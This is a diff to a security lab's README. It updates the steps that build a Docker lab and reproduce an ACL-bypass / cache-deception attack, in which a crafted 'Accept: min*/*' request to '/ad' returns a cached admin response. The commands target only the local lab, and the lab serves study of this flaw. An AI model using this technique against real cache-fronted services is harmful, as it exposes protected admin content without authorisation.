@@ -48,12 +48,13 @@ tests/                     Automated checks that the lab scenarios behave as doc
 ```bash
 # 1. Stand up the lab
 cd lab
+chmod +x scripts/*.sh
 ./scripts/gen-certs.sh
 docker compose up -d --build
 
 # 2. Reproduce the ACL-bypass / cache-deception scenario
-curl -s -H "Accept: */*" http://localhost:8080/admin          # denied (not localhost)
-curl -s -H "Accept: */*" http://localhost:8080/debug/seed-admin-cache  # lab helper: seed as "localhost"
+curl -s -o /dev/null -w "%{http_code}\n" -H "Accept: */*" http://localhost:8080/admin  # 403, denied (not localhost)
+./scripts/seed-admin-cache.sh                                  # seeds the cache as if requested from localhost
 curl -s -H "Accept: min*/*" http://localhost:8080/ad -D -      # collides, returns cached admin response
 
 # 3. Run the fuzzer against the lab
